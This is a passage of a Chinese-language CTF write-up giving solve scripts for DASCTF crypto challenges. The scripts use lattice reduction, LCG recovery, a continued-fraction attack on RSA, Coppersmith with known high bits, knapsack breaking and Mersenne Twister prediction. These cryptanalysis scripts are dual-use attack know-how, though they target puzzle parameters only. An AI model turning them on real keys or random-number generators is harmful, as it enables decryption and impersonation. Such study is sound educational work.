00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9</span></span><br><span class="line"><span class="string">q 0241 00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb+</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">n = <span class="number">0x00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span></span><br><span class="line">e = <span class="number">0x010001</span></span><br><span class="line">d = <span class="number">0x00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span></span><br><span class="line">c = <span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(pow(c, d, n)))</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="comment"># 因为print出来的不太完整，而且题目叫 “XOR贯穿始终”，</span></span><br><span class="line"><span class="comment"># 所以猜测还得异或压缩包密码</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m ^ bytes_to_long(<span class="string">b&#x27;C0ngr4tulati0n5_y0u_fou^d_m3&#x27;</span>)))</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Easy-3L"><a href="#Easy-3L" class="headerlink" title="Easy_3L"></a>Easy_3L</h2><p>考点：格基约化+LCG参数恢复<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage运行</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知信息</span></span><br><span class="line">p = <span class="number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line">h = <span class="number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line">c = <span class="number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 s[3]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line"><span class="string">print(a.nbits())</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">bal = <span class="number">2</span>**<span class="number">512</span>	<span class="comment"># 可以是别的数，我测试过，似乎是大于等于256的都行 (可能?)</span></span><br><span class="line">M = Matrix([[bal, <span class="number">0</span>, c], [<span class="number">0</span>, <span class="number">1</span>, -h], [<span class="number">0</span>, <span class="number">0</span>, p]])</span><br><span class="line"><span class="comment">#print(M.LLL())</span></span><br><span class="line"><span class="comment"># 猜的第一组，结果还真是。。。。</span></span><br><span class="line">M = M.LLL()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复LCG</span></span><br><span class="line"><span class="comment"># 前几周做题的时候碰见过，就直接照搬了当时找到的脚本</span></span><br><span class="line">S3 = <span class="built_in">abs</span>(M[-<span class="number">1</span>])</span><br><span class="line">S1 = <span class="number">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line">S2 = <span class="number">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line">S4 = <span class="number">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line">S5 = <span class="number">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line">S = [S1, S2, S3, S4, S5]</span><br><span class="line">T = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(S, S[<span class="number">1</span>:])]</span><br><span class="line">p = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(T, T[<span class="number">1</span>:], T[<span class="number">2</span>:])]</span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">abs</span>(reduce(gcd, p)))</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line">A = Matrix([[S[<span class="number">0</span>], S[<span class="number">1</span>], <span class="number">1</span>/p, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>/p, <span class="number">0</span>], [-S[<span class="number">1</span>], -S[<span class="number">2</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [p, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, p, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line"><span class="comment">#print(A)</span></span><br><span class="line">A = A.LLL()</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> i[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> i[-<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">            a, b = i[<span class="number">2</span>] * p, i[<span class="number">3</span>] * p</span><br><span class="line">        <span class="keyword">elif</span> i[-<span class="number">1</span>] == -<span class="number">1</span>:</span><br><span class="line">            a, b = -i[<span class="number">2</span>] * p, -i[<span class="number">3</span>] * p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> (a, b):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;[*] No solves&quot;</span>)</span><br><span class="line">a %= p</span><br><span class="line">b %= p</span><br><span class="line">a1 = invert(a, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回溯到s[0], 即flag</span></span><br><span class="line">f = long_to_bytes((a1*(S[<span class="number">0</span>]-b)) % p)</span><br><span class="line"><span class="keyword">if</span> f[:<span class="number">4</span>] == <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">or</span> f[:<span class="number">6</span>] == <span class="string">b&#x27;DASCTF&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(f)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="esyRSA"><a href="#esyRSA" class="headerlink" title="esyRSA"></a>esyRSA</h2><p>考点：连分数攻击<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line">d = <span class="number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line"><span class="comment"># 生成连分数的分母及分子</span></span><br><span class="line"><span class="comment"># d/n &gt;&gt;&gt; k/e</span></span><br><span class="line">cf = continued_fraction(d/n)</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    num = cf.numerator(i)</span><br><span class="line">    den = cf.denominator(i)		<span class="comment">#即e</span></span><br><span class="line">    <span class="comment"># 符合条件就输出, 至于为啥长度得是五才行, 我猜的 (主要是看题目的e有五个问号)</span></span><br><span class="line">    <span class="keyword">if</span> (den*d-<span class="number">1</span>) % num==<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">str</span>(den))&gt;=<span class="number">5</span>:</span><br><span class="line">        phi = ((den*d-<span class="number">1</span>)//num)</span><br><span class="line">        p_q = n+<span class="number">1</span>-phi</span><br><span class="line">        <span class="built_in">print</span>(md5(<span class="built_in">str</span>(p_q).encode()).hexdigest())</span><br><span class="line">        <span class="comment"># 4ae33bea90f030bfddb7ac4d9222ef8f</span></span><br></pre></td></tr></table></figure>
<h2 id="MCeorpkpleer"><a href="#MCeorpkpleer" class="headerlink" title="MCeorpkpleer"></a>MCeorpkpleer</h2><p>考点：背包密码+已知p的高位Coppersmith攻击<br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">p = <span class="number">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></span><br><span class="line">n = <span class="number">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></span><br><span class="line">c = <span class="number">156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span></span><br><span class="line">pubkey = [<span class="number">18143710780782459577</span>, <span class="number">54431132342347378731</span>, <span class="number">163293397027042136193</span>, <span class="number">489880191081126408579</span>, <span class="number">1469640573243379225737</span>, <span class="number">4408921719730137677211</span>, <span class="number">13226765159190413031633</span>, <span class="number">39680295477571239094899</span>, <span class="number">119040886432713717284697</span>, <span class="number">357122659298141151854091</span>, <span class="number">1071367977894423455562273</span>, <span class="number">3214103933683270366686819</span>, <span class="number">9642311801049811100060457</span>, <span class="number">28926935403149433300181371</span>, <span class="number">86780806209448299900544113</span>, <span class="number">260342418628344899701632339</span>, <span class="number">781027255885034699104897017</span>, <span class="number">2343081767655104097314691051</span>, <span class="number">7029245302965312291944073153</span>, <span class="number">21087735908895936875832219459</span>, <span class="number">63263207726687810627496658377</span>, <span class="number">189789623180063431882489975131</span>, <span class="number">569368869540190295647469925393</span>, <span class="number">1708106608620570886942409776179</span>, <span class="number">601827224419797931380408071500</span>, <span class="number">1805481673259393794141224214500</span>, <span class="number">893952418336266652976851386463</span>, <span class="number">2681857255008799958930554159389</span>, <span class="number">3523079163584485147344841221130</span>, <span class="number">1524252287869625983140881149316</span>, <span class="number">50264262166963219975822190911</span>, <span class="number">150792786500889659927466572733</span>, <span class="number">452378359502668979782399718199</span>, <span class="number">1357135078508006939347199154597</span>, <span class="number">4071405235524020818041597463791</span>, <span class="number">3169230503688232995231149877299</span>, <span class="number">462706308180869526799807117823</span>, <span class="number">1388118924542608580399421353469</span>, <span class="number">4164356773627825741198264060407</span>, <span class="number">3448085117999647764701149667147</span>, <span class="number">1299270151115113835209806487367</span>, <span class="number">3897810453345341505629419462101</span>, <span class="number">2648446157152195057994615872229</span>, <span class="number">3422845870014670444537026359650</span>, <span class="number">1223552407160181874717436564876</span>, <span class="number">3670657221480545624152309694628</span>, <span class="number">1966986461557807413563286569810</span>, <span class="number">1378466783231507511243038452393</span>, <span class="number">4135400349694522533729115357179</span>, <span class="number">3361215846199738142293703557463</span>, <span class="number">1038662335715384967987468158315</span>, <span class="number">3115987007146154903962404474945</span>, <span class="number">302975818554635252993570910761</span>, <span class="number">908927455663905758980712732283</span>, <span class="number">2726782366991717276942138196849</span>, <span class="number">3657854499533237101379593333510</span>, <span class="number">1928578295715881845245137486456</span>, <span class="number">1263242285705730806288591202331</span>, <span class="number">3789726857117192418865773606993</span>, <span class="number">2324195368467747797703678306905</span>, <span class="number">2450093503961328663664213663678</span>, <span class="number">2827787910442071261545819733997</span>, <span class="number">3960871129884299055190637944954</span>, <span class="number">2837628186769067706678271320788</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pubkey))</span><br><span class="line">en_e = <span class="number">31087054322877663244023458448558</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知p的高位Coppersmith攻击</span></span><br><span class="line">p4 = <span class="number">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span></span><br><span class="line">p4 &gt;&gt;= <span class="number">435</span></span><br><span class="line">n = <span class="number">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span></span><br><span class="line"><span class="comment">#全位数</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line"><span class="comment">#缺省位数</span></span><br><span class="line">kbits = pbits - p4.nbits()<span class="comment">#nbits()位数</span></span><br><span class="line"><span class="built_in">print</span> (p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n)) </span><br><span class="line">f = x + p4</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = <span class="built_in">int</span>(p4+x0)</span><br><span class="line"><span class="comment"># print (&quot;p: &quot;, hex(int(p)))</span></span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 背包密码</span></span><br><span class="line"><span class="comment"># 刚开始以为有点像得用贪心算法的, 但确实用不了。。。</span></span><br><span class="line"><span class="comment"># 后来看着有点像背包密码, 于是就拿在NSS上学到的一个脚本来试试, 然后就成了</span></span><br><span class="line">b = pubkey</span><br><span class="line">nn = <span class="built_in">len</span>(b)</span><br><span class="line"><span class="comment"># print(nn)</span></span><br><span class="line">L = Matrix(ZZ, nn+<span class="number">1</span>, nn+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	L[i,i] = <span class="number">1</span></span><br><span class="line">	L[i,-<span class="number">1</span>] = b[i]</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = -en_e</span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">	M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">		<span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">		flag = <span class="literal">False</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">    	e = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M[:-<span class="number">1</span>]]), <span class="number">2</span>)</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="comment">#print(p)</span></span><br><span class="line">        <span class="comment">#print(q)</span></span><br><span class="line">        <span class="keyword">assert</span> GCD(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) == <span class="number">1</span></span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># b&#x27;DASCTF&#123;T81I_tPPS_6r7g_xlPi_OO3M_6vyV_Rkba&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="SigninCrypto"><a href="#SigninCrypto" class="headerlink" title="SigninCrypto"></a>SigninCrypto</h2><p>考点：MT19937+异或+DES3<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="comment"># from string import ascii_letters</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得K2</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\luyuj\\Downloads\\SigninCrypto\\task.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ran = f.read().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">ran_bit = [<span class="built_in">int</span>(i[<span class="number">2</span>:], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ran]</span><br><span class="line"><span class="comment"># 题目给了完整的16位的随机数，这是32位数的高位;</span></span><br><span class="line"><span class="comment"># 虽然64位的随机数不完整，但我们可以得到其低位，同时也可以是32位数的低位</span></span><br><span class="line">high = ran_bit[:<span class="number">624</span>]</span><br><span class="line">low = ran_bit[<span class="number">624</span>:]</span><br><span class="line">s = []</span><br><span class="line"><span class="comment"># 转换出32位的随机数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(low)):</span><br><span class="line">    s.extend(</span><br><span class="line">        (</span><br><span class="line">            (high[<span class="number">2</span> * i] &lt;&lt; <span class="number">16</span>) + (low[i] &amp; <span class="number">0xFFFF</span>),</span><br><span class="line">            (high[<span class="number">2</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">16</span>) + (low[i] &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"><span class="comment"># 在网上搜的时候, 看到这个工具, 就直接拿来用了</span></span><br><span class="line">rand = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rand.submit(s[i])</span><br><span class="line">K2 = long_to_bytes(rand.predict_getrandbits(<span class="number">64</span>))</span><br><span class="line">c = <span class="string">&#x27;a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1&#x27;</span></span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得K1</span></span><br><span class="line"><span class="comment"># print(ascii_letters)</span></span><br><span class="line">ascii_letters = <span class="string">b&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">xor = <span class="number">334648638865560142973669981316964458403</span></span><br><span class="line">get = <span class="number">0</span></span><br><span class="line">K1 = <span class="string">b&#x27;&#x27;</span> <span class="comment">#dasctfda</span></span><br><span class="line"><span class="comment"># 因为是两个随机字节, 所以就直接爆破就行, 然后用字母表判断来停止爆破</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">        hint = (long_to_bytes(i) + long_to_bytes(j)) * <span class="number">8</span></span><br><span class="line">        res = long_to_bytes(bytes_to_long(hint) ^ xor)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">            <span class="keyword">if</span> res[k] <span class="keyword">not</span> <span class="keyword">in</span> ascii_letters:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> k == <span class="built_in">len</span>(res)-<span class="number">1</span>:</span><br><span class="line">                K1 = res</span><br><span class="line">                get = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> get:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> get:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&quot;GWHTGWHT&quot;</span></span><br><span class="line"><span class="comment"># 爆破最后一位, 然后直接解密去得到flag</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    key = K1 + K2 + <span class="string">b&#x27;DASCTF&#123;&#x27;</span> + long_to_bytes(j)</span><br><span class="line">    mode = DES3.MODE_CBC</span><br><span class="line">    des3 = DES3.new(key, mode, iv)</span><br><span class="line">    m = des3.decrypt(ct)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#123;&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;\x04\x04\x04\x04&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Danger-RSA"><a href="#Danger-RSA" class="headerlink" title="Danger_RSA"></a>Danger_RSA</h2><p>考点：素数生成+多项式环<br>exp：<br>在网上找到一个类似题目的<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63321019/article/details/131805582?spm=1001.2014.3001.5501">wp</a>，就直接拿来用了。</p>
